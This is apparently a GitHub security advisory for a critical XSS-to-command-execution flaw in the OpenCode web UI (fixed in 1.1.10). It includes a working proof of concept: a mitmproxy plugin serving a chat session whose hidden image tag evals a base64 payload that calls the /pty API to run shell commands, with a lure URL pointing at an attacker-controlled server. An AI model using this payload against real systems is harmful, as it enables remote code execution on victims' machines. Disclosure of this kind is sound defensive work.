# [C] Malicious website can execute commands on the local system through XSS in the OpenCode web UI

## Summary
Severity: Critical
Advisory: GHSA-c83v-7274-4vgp
CVE: CVE-2026-22813
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-c83v-7274-4vgp
Type: github-advisory

## Affected
- npm: `opencode-ai` — affected >=0 <1.1.10

## Details
### Summary
A malicious website can abuse the server URL override feature of the OpenCode web UI to achieve cross-site scripting on `http://localhost:4096`. From there, it is possible to run arbitrary commands on the local system using the `/pty/` endpoints provided by the OpenCode API.

### Code execution via OpenCode API

- The OpenCode API has `/pty/` endpoints that allow spawning arbitrary processes on the local machine.
- When you run `opencode` in your terminal, OpenCode automatically starts an HTTP server on `localhost:4096` that exposes the API along with a web interface.
- JavaScript can make arbitrary same-origin `fetch()` requests to the `/pty/` API endpoints. Therefore, JavaScript execution on `http://localhost:4096` gets you code execution on local the machine.

### JavaScript execution on localhost:4096   

The markdown renderer used for LLM responses will insert arbitrary HTML into the DOM. There is no sanitization with DOMPurify or even a CSP on the web interface to prevent JavaScript execution via HTML injection.

This means controlling the LLM response for a chat session gets you JavaScript execution on the `http://localhost:4096` origin. This alone would not be enough for a 1-click exploit, but there's functionality in `packages/app/src/app.tsx` to allow specifying a custom server URL in a `?url=...` parameter:

```javascript
// packages/app/src/app.tsx
const defaultServerUrl = iife(() => {
  const param = new URLSearchParams(document.location.search).get("url")
  if (param) return param
  
  // [truncated]
  
  return window.location.origin
})
```

Using this custom server URL functionality, you can make the web UI connect to and load chat sessions from an OpenCode instance on another URL. For example, tricking a user into opening http://localhost:4096/Lw/session/ses_45d2d9723ffeHN2DLrTYMz4mHn?url=https://opencode.attacker.example in their browser would load and display `ses_45d2d9723ffeHN2DLrTYMz4mHn` from the attacker-controlled server at https://opencode.attacker.example.

### Note on exploitability

Because the localhost web UI proxies static resources from a remote location, the OpenCode team was able to prevent exploitation of this issue by making a server-side change to no longer respect the `?url=` parameter. This means the specific vulnerability used to achieve XSS on the localhost web UI no longer works as of `Fri, 09 Jan 2026 21:36:31 GMT`. Users are still strongly encouraged to upgrade to version 1.1.10 or later, as this disables the web UI/OpenCode API to reduce the attack surface of the application. Any future XSS vulnerabilities in the web UI would still impact users on OpenCode versions before 1.10.0. 

### Proof of Concept

A simple way to serve a malicious chat session is by setting up mitmproxy in front of a real OpenCode instance. This is necessary because the OpenCode web UI must load a bunch of resources before it loads and displays the chat session.

1. Spawn an OpenCode instance in a Docker container

```
$ docker run -it --rm -p 4096:4096 ghcr.io/anomalyco/opencode:latest --hostname 0.0.0.0
```

2. Create a file called `plugin.py` with the contents below

```python
import base64
import json

payload = """
(async () => {
    // const ptyInit = {'command':'/bin/sh', 'args': ['-c', 'open -F -a Calculator.app']};
    const ptyInit = {'command':'/bin/sh', 'args': ['-c', 'touch /tmp/albert-was-here.txt']};
    const r = await fetch('/pty', {method: 'POST', body: JSON.stringify(ptyInit), headers: {'Content-Type': 'application/json'}});
    const pty_id = (await r.json())['id'];
    await new Promise(r => setTimeout(r, 500));
    await fetch('/pty/' + pty_id, {method: 'DELETE'})
    window.location.replace('https://example.com');
})()
"""

# Other messages have been removed from this codeblock for brevity
malicious_messages = [
    #  [truncated]
    {
        # [truncated]
        "parts": [
            # [truncated]
            {
                "id": "prt_ba2d26ca0001fcRfwfEZ4bP7gF",
                "sessionID": "ses_45d2d9723ffeHN2DLrTYMz4mHn",
                "messageID": "msg_ba2d269130016guS0KSZ0FY2J9",
                "type": "text",
                "text": f"Hello, World!\n<img src=\"/favicon.png\" onerror=\"eval(atob('{base64.b64encode(payload.encode()).decode()}'))\" style=\"display: none;\">",
                "time": {
                    "start": 1767963258360,
                    "end": 1767963258360
                }
            },
            # [truncated]
        ]
    }
]

malicious_session = {"id":"ses_45d2d9723ffeHN2DLrTYMz4mHn","version":"1.0.220","projectID":"global","directory":"/","title":"Hello World!","time":{"created":1767963257052,"updated":1767963258366},"summary":{"additions":0,"deletions":0,"files":0}}

async def response(flow):
    if flow.request.path.split('?')[0] == '/session':
        flow.response.text = json.dumps([malicious_session], separators=(',', ':'))
    elif flow.request.path.split('?')[0] == '/session/ses_45d2d9723ffeHN2DLrTYMz4mHn':
        flow.response.status_code = 200
        flow.response.text = json.dumps(malicious_session, separators=(',', ':'))
    elif flow.request.path.split('?')[0] == '/session/ses_45d2d9723ffeHN2DLrTYMz4mHn/message':
        flow.response.text = json.dumps(malicious_messages, separators=(',', ':'))
```

3. Start mitmproxy with the plugin in reverse proxy mode

```
$ mitmproxy -s plugin.py -p 12345 -m upstream:http://localhost:4096
```

4. Start OpenCode in your terminal as the victim

```
$ opencode
```

5. Visit the following URL in a browser on the same machine running OpenCode: http://localhost:4096/Lw/session/ses_45d2d9723ffeHN2DLrTYMz4mHn?url=http://localhost:12345

6. Confirm the file `albert-was-here.txt` was created in the `/tmp/` directory

```
$ ls /tmp/
albert-was-here.txt
```

## References
- https://github.com/anomalyco/opencode/security/advisories/GHSA-c83v-7274-4vgp
- https://nvd.nist.gov/vuln/detail/CVE-2026-22813
- https://github.com/anomalyco/opencode
